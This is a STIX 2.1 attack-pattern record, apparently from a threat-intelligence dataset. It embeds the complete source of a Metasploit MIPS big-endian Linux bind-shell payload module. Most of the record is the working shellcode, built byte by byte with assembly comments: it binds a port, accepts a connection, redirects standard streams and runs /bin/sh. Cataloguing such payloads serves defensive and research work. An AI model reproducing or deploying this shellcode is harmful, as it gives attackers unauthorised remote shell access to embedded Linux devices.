{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--067985c5-1c23-44e7-9c0c-f0aac16968af",
    "created": "2024-08-14T16:33:19.454594Z",
    "modified": "2024-08-14T16:33:19.454598Z",
    "name": "Linux Command Shell, Bind TCP Inline",
    "description": "Listen for a connection and spawn a command shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/mipsbe/shell_bind_tcp.rb",
            "external_id": "shell_bind_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 232\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux Command Shell, Bind TCP Inline',\n      'Description'   => 'Listen for a connection and spawn a command shell',\n      'Author'        =>\n        [\n          'scut',             # Original mips-irix-portshell shellcode\n          'vaicebine',        # Original shellcode mod\n          'Vlatko Kosturjak', # Metasploit module (mipsle)\n          'juan vazquez'      # mipsbe conversion plus small fixes and optimizations\n        ],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_MIPSBE,\n      'Handler'       => Msf::Handler::BindTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix,\n      'Payload'       =>\n        {\n          'Offsets' => {} ,\n          'Payload' => ''\n        })\n    )\n  end\n\n  def generate(_opts = {})\n    if !datastore['LPORT']\n      return super\n    end\n\n    port = Integer(datastore['LPORT'])\n    port = [port].pack(\"n\").unpack(\"cc\");\n\n    shellcode =\n    # socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3\n    \"\\x27\\xbd\\xff\\xe0\" + #     addiu   sp,sp,-32\n    \"\\x24\\x0e\\xff\\xfd\" + #     li      t6,-3\n    \"\\x01\\xc0\\x20\\x27\" + #     nor     a0,t6,zero\n    \"\\x01\\xc0\\x28\\x27\" + #     nor     a1,t6,zero\n    \"\\x28\\x06\\xff\\xff\" + #     slti    a2,zero,-1\n    \"\\x24\\x02\\x10\\x57\" + #     li      v0,4183 ( __NR_socket )\n    \"\\x01\\x01\\x01\\x0c\" + #     syscall\n\n    # bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr(\"0.0.0.0\")}, 16) = 0\n    \"\\x30\\x50\\xff\\xff\" + #     andi    s0,v0,0xffff\n    \"\\x24\\x0e\\xff\\xef\" + #     li      t6,-17                        ; t6: 0xffffffef\n    \"\\x01\\xc0\\x70\\x27\" + #     nor     t6,t6,zero                    ; t6: 0x10 (16)\n    \"\\x24\\x0d\\xff\\xfd\" + #     li      t5,-3                         ; t5: -3\n    \"\\x01\\xa0\\x68\\x27\" + #     nor     t5,t5,zero                    ; t5: 0x2\n    \"\\x01\\xcd\\x68\\x04\" + #     sllv    t5,t5,t6                      ; t5: 0x00020000\n    \"\\x24\\x0e\" + port.pack(\"C2\") +  #     li      t6,0xFFFF (port)   ; t6: 0x115c (4444 (default LPORT))\n    \"\\x01\\xae\\x68\\x25\" + #     or      t5,t5,t6                      ; t5: 0x0002115c\n    \"\\xaf\\xad\\xff\\xe0\" + #     sw      t5,-32(sp)\n    \"\\xaf\\xa0\\xff\\xe4\" + #     sw      zero,-28(sp)\n    \"\\xaf\\xa0\\xff\\xe8\" + #     sw      zero,-24(sp)\n    \"\\xaf\\xa0\\xff\\xec\" + #     sw      zero,-20(sp)\n    \"\\x02\\x10\\x20\\x25\" + #     or      a0,s0,s0\n    \"\\x24\\x0e\\xff\\xef\" + #     li      t6,-17\n    \"\\x01\\xc0\\x30\\x27\" + #     nor     a2,t6,zero\n    \"\\x23\\xa5\\xff\\xe0\" + #     addi    a1,sp,-32\n    \"\\x24\\x02\\x10\\x49\" + #     li      v0,4169 ( __NR_bind )A\n    \"\\x01\\x01\\x01\\x0c\" + #     syscall\n\n    # listen(3, 257) = 0\n    \"\\x02\\x10\\x20\\x25\" + #     or      a0,s0,s0\n    \"\\x24\\x05\\x01\\x01\" + #     li      a1,257\n    \"\\x24\\x02\\x10\\x4e\" + #     li      v0,4174 ( __NR_listen )\n    \"\\x01\\x01\\x01\\x0c\" + #     syscall\n\n    # accept(3, 0, NULL) = 4\n    \"\\x02\\x10\\x20\\x25\" + #     or      a0,s0,s0\n    \"\\x28\\x05\\xff\\xff\" + #     slti    a1,zero,-1\n    \"\\x28\\x06\\xff\\xff\" + #     slti    a2,zero,-1\n    \"\\x24\\x02\\x10\\x48\" + #     li      v0,4168 ( __NR_accept )\n    \"\\x01\\x01\\x01\\x0c\" + #     syscall\n\n    # dup2(4, 2) = 2\n    # dup2(4, 1) = 1\n    # dup2(4, 0) = 0\n    \"\\xaf\\xa2\\xff\\xff\" + #     sw v0,-1(sp) # socket\n    \"\\x24\\x11\\xff\\xfd\" + #     li s1,-3\n    \"\\x02\\x20\\x88\\x27\" + #     nor s1,s1,zero\n    \"\\x8f\\xa4\\xff\\xff\" + #     lw a0,-1(sp)\n    \"\\x02\\x20\\x28\\x21\" + #     move a1,s1 # dup2_loop\n    \"\\x24\\x02\\x0f\\xdf\" + #     li v0,4063 ( __NR_dup2 )\n    \"\\x01\\x01\\x01\\x0c\" + #     syscall 0x40404\n    \"\\x24\\x10\\xff\\xff\" + #     li s0,-1\n    \"\\x22\\x31\\xff\\xff\" + #     addi s1,s1,-1\n    \"\\x16\\x30\\xff\\xfa\" + #     bne s1,s0 <dup2_loop>\n\n    # execve(\"//bin/sh\", [\"//bin/sh\"], [/* 0 vars */]) = 0\n    \"\\x28\\x06\\xff\\xff\" + #     slti a2,zero,-1\n    \"\\x3c\\x0f\\x2f\\x2f\" + #     lui t7,0x2f2f \"//\"\n    \"\\x35\\xef\\x62\\x69\" + #     ori t7,t7,0x6269 \"bi\"\n    \"\\xaf\\xaf\\xff\\xec\" + #     sw t7,-20(sp)\n    \"\\x3c\\x0e\\x6e\\x2f\" + #     lui t6,0x6e2f \"n/\"\n    \"\\x35\\xce\\x73\\x68\" + #     ori t6,t6,0x7368 \"sh\"\n    \"\\xaf\\xae\\xff\\xf0\" + #     sw t6,-16(sp)\n    \"\\xaf\\xa0\\xff\\xf4\" + #     sw zero,-12(sp)\n    \"\\x27\\xa4\\xff\\xec\" + #     addiu a0,sp,-20\n    \"\\xaf\\xa4\\xff\\xf8\" + #     sw a0,-8(sp)\n    \"\\xaf\\xa0\\xff\\xfc\" + #     sw zero,-4(sp)\n    \"\\x27\\xa5\\xff\\xf8\" + #     addiu a1,sp,-8\n    \"\\x24\\x02\\x0f\\xab\" + #     li v0,4011 ( __NR_execve )\n    \"\\x01\\x01\\x01\\x0c\"   #     syscall 0x40404\n\n    return super + shellcode\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}